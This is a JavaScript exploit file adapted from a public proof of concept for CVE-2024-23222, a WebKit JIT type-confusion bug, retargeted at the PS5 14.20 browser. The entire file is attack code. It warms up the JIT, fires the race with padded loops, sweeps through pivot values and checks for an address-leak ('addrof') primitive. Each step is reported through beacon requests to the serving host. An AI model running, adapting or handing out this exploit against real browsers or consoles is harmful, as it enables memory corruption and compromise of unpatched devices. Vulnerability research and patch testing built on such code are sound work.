// p179 — CVE-2024-23222 FTL TOCTOU type confusion for PS5 14.20
// WebKit Version/17.0 Safari/605.1.15 — before the Jan 2024 fix
//
// Adapted from califio/publications PoC. Changes for PS5:
// - Beacon-based reporting instead of print/postMessage
// - PIVOT sweep mode: tries multiple values to find the sweet spot
// - Main-thread execution (PS5 Workers work but let's start simple)
// - Conservative GC flush count for PS5 memory
//
// Beacon prefix: V179-

(function() {
  "use strict";

  var BASE = location.protocol + '//' + location.host;

  function syncB(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', BASE + '/beacon/V179-' + tag + '?t=' + Date.now(), false);
      x.send();
    } catch(e) {}
  }

  syncB('BOOT');

  // Step 1: Verify JIT is active by timing a hot loop
  var t0 = Date.now();
  var sum = 0;
  function hotLoop(n) { for (var i = 0; i < n; i++) sum += i; }
  hotLoop(10); // cold
  var t1 = Date.now();
  for (var w = 0; w < 100000; w++) hotLoop(10); // warmup to JIT
  var t2 = Date.now();
  hotLoop(10); // hot
  var t3 = Date.now();

  syncB('JIT-COLD-' + (t1 - t0) + '-WARM-' + (t2 - t1) + '-HOT-' + (t3 - t2));

  // Step 2: Check if FTL tier is reachable
  // FTL kicks in after ~100K-200K iterations. Let's test with a property access.
  var ftlTestObj = { a: 1.1, b: 2.2 };
  function ftlTest(o) { return o.a + o.b; }
  var ft0 = Date.now();
  for (var fi = 0; fi < 300000; fi++) ftlTest(ftlTestObj);
  var ft1 = Date.now();
  syncB('FTL-300K-' + (ft1 - ft0) + 'ms');

  // Step 3: The actual CVE-2024-23222 trigger
  // Using a single-attempt approach first, with a configurable PIVOT
  // We'll do a sweep: PIVOT values 50K, 100K, 150K, 175K, 200K

  var R = 4294967296;          // 2^32
  var D = R - 1;               // 0xffffffff

  var _f64 = new Float64Array(1);
  var _u32 = new Uint32Array(_f64.buffer);

  function f2i(d) { _f64[0] = d; return _u32[1] * R + _u32[0]; }
  function i2f(i) { _u32[1] = i / R; _u32[0] = i & D; return _f64[0]; }
  function hex(i) { return i === null ? "(n/a)" : "0x" + i.toString(16); }

  // Wide sweep: DFG range (500-10K), DFG-FTL gap (20K-50K), FTL range (80K-300K)
  var PIVOTS = [500, 1000, 2000, 5000, 10000, 20000, 40000, 80000, 120000, 160000, 200000, 300000];
  var pivotIndex = 0;

  function tryPivot(WARMUP_TOTAL, STRUCTURE_PIVOT) {
    var pm = {};
    var result = {};

    pm.phantom = {
      fakeHeader: 1,
      fakeButterfly: 2,
    };
    pm.trapArray = [1.1, pm.phantom];

    var trainingArray = [1.1, 1.1];
    trainingArray.ho = 1.1;
    var fallbackArray = [1.1, 2.2];
    fallbackArray.ho = 1.1;

    function n() {}
    var targetObj    = Reflect.construct(Object, [], n);
    var divergentObj = Reflect.construct(Object, [], n);
    targetObj.p1 = trainingArray;
    targetObj.p2 = trainingArray;
    divergentObj.p1 = 0x1337;
    divergentObj.p2 = 0x1337;
    delete divergentObj.p2;
    delete divergentObj.p1;
    divergentObj.p1 = 0x1337;
    divergentObj.p2 = 0x1337;

    var guardObj = {
      guard_p1: 1,
      p1: [1.1, 2.2],
    };

    var lowBits  = new Uint32Array(2);
    var asDouble = new Float64Array(lowBits.buffer);

    // 47 while-loops per side to widen the CFA-to-CFold gap
    var trigger = function (useDivergent, earlyExit) {
      if (earlyExit) return;
      var obj = targetObj;
      if (useDivergent) {
        obj = divergentObj;
        0[0];
      }
      var h = 0;
      while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;
      while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;
      while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;
      while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;
      while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;
      while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;
      while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;
      while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;
      while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;
      while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;
      while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;
      while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;
      while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;
      while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;
      while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;
      while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;
      while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;
      while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;
      while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;
      while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;
      while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;
      while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;
      while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;
      while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;
      while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;
      while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;
      while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;
      while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;
      while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;
      while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;
      while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;
      while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;
      while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;
      while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;
      while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;
      while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;
      while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;
      while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;
      while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;
      while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;
      while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;
      while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;
      while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;
      while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;
      while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;
      while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;
      while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;

      "uo" in obj;
      var arr = obj.p1;
      if (useDivergent) arr = fallbackArray;
      asDouble[0] = arr[1];
      lowBits[0] = lowBits[0] + 16;
      arr[1] = asDouble[0];

      while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;
      while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;
      while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;
      while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;
      while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;
      while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;
      while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;
      while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;
      while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;
      while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;
      while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;
      while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;
      while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;
      while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;
      while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;
      while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;
      while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;
      while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;
      while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;
      while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;
      while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;
      while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;
      while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;
      while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;
      while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;
      while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;
      while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;
      while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;
      while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;
      while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;
      while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;
      while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;
      while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;
      while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;
      while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;
      while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;
      while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;
      while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;
      while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;
      while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;
      while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;
      while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;
      while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;
      while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;
      while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;
      while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;
      while (h < 1) { guardObj.guard_p1 = 1; h++; } h--;
    };

    // Warmup
    for (var t = 0; t < WARMUP_TOTAL; t++) {
      if (t > STRUCTURE_PIVOT) {
        trigger(false, true);
        continue;
      }
      trigger(t % 2 && t < 256, t > 4096);
      if (t == STRUCTURE_PIVOT) delete targetObj.p2;
    }

    // GC flush
    for (var t = 0; t < 262144; t++) new Array(13.37, 13.37, 13.37, 13.37);

    // The swap + single fire
    delete targetObj.p1;
    targetObj.p1 = pm.trapArray;
    targetObj.p2 = 1;

    trigger(false, false);

    // Check result
    var leaked_plus16 = lowBits[1] * R + lowBits[0];
    var leaked = leaked_plus16 - 16;

    var addrofWon =
      leaked > 0
      && lowBits[1] < 0x10000
      && lowBits[1] > 0
      && (leaked % 16) === 0;

    var fake = pm.trapArray[1];
    var slotChanged = (fake !== pm.phantom);
    var won = addrofWon && slotChanged;

    return {
      won: won,
      leaked: leaked,
      high32: lowBits[1],
      low32: lowBits[0],
      slotChanged: slotChanged
    };
  }

  // Run the PIVOT sweep
  syncB('SWEEP-START');

  for (var pi = 0; pi < PIVOTS.length; pi++) {
    var pivot = PIVOTS[pi];
    var warmup = pivot + 75000; // warmup needs to be > pivot
    var ta = Date.now();
    syncB('TRY-P' + pivot);

    var r;
    try {
      r = tryPivot(warmup, pivot);
    } catch(e) {
      syncB('ERR-P' + pivot + '-' + (e.message || '').substring(0, 30));
      continue;
    }
    var tb = Date.now();

    if (r.won) {
      syncB('HIT-P' + pivot + '-ADDR-' + hex(r.leaked) + '-H' + hex(r.high32));
      syncB('ADDROF-WON');
      // Don't try more pivots — we won!
      break;
    } else {
      syncB('MISS-P' + pivot + '-' + (tb-ta) + 'ms-H' + hex(r.high32) + '-L' + hex(r.low32) + '-SC' + (r.slotChanged ? '1' : '0'));
    }
  }

  syncB('SWEEP-DONE');
  syncB('COMPLETE');
})();
